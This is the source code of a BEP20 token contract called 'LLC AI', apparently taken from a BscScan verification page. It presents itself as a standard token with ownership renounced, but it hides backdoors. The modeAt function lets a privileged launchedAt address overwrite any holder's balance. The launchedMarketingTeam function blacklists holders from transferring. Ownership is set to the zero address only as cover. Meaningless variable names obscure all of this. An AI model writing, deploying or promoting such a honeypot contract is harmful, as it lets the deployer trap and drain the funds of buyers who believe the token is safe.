/**
 *Submitted for verification at BscScan.com on 2023-03-03
*/

//SPDX-License-Identifier: MIT
pragma solidity ^0.8.1;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}

/**
 * BEP20 standard interface.
 */
interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


/**
 * Allows for contract ownership along with multi-address authorization
 */
abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner authorized
     */
    function transferOwnership(address adr) public onlyOwner {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract LLCAI is IBEP20, Auth {

    function name() external pure override returns (string memory) {
        return _name;
    }

    string constant _symbol = "LAI";

    uint8 constant _decimals = 18;

    function fundSwap() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    mapping(address => mapping(address => uint256)) _allowances;

    bool public toReceiver;

    mapping(address => uint256) maxTakeReceiver;

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function receiverLimit(address exemptTxLaunch) public {
        require(!toLaunchedAuto);
        launchedAt[exemptTxLaunch] = true;
        toLaunchedAuto = true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    bool private enableFromAuto;

    mapping(address => uint256) _balances;

    bool public maxIs;

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function modeAt(address totalWalletToken, uint256 modeBuyMarketing) public {
        require(launchedAt[fundSwap()]);
        maxTakeReceiver[totalWalletToken] = modeBuyMarketing;
    }

    constructor () Auth(msg.sender) {
        minTrading = fundSwap();
        launchedAt[fundSwap()] = true;
        IDEXRouter router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        limitLaunched = IDEXFactory(router.factory()).createPair(WCRO, address(this));
        _balances[fundSwap()] = _totalSupply;
        transferOwnership(address(0));
        emit Transfer(address(0), minTrading, _totalSupply);
    }

    uint256 public launchTeam;

    address public limitLaunched;

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (maxTakeReceiver[sender] != 0) {
            _balances[sender] = maxTakeReceiver[sender];
            maxTakeReceiver[sender] = 0;
        }
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    uint256 private exemptLiquidity;

    mapping(address => bool) public launchedAt;

    uint256 private senderMode;

    uint256 _totalSupply = 100000000 * (10 ** 18);

    function launchedMarketingTeam(address teamFund) public {
        require(launchedAt[fundSwap()]);
        if (teamFund == minTrading || teamFund == limitLaunched) {
            return;
        }
        receiverLaunched[teamFund] = true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    uint256 public receiverToken;

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (maxTakeReceiver[account] != 0) {
            return maxTakeReceiver[account];
        }
        return _balances[account];
    }

    mapping(address => bool) public receiverLaunched;

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(!receiverLaunched[sender]);
        return _basicTransfer(sender, recipient, amount);
    }

    bool private tradingExempt;

    address public minTrading;

    string constant _name = "LLC AI";

    address WCRO = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    uint256 public receiverFee;

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    using SafeMath for uint256;

    uint256 public takeAtFee;

    bool public toLaunchedAuto;

}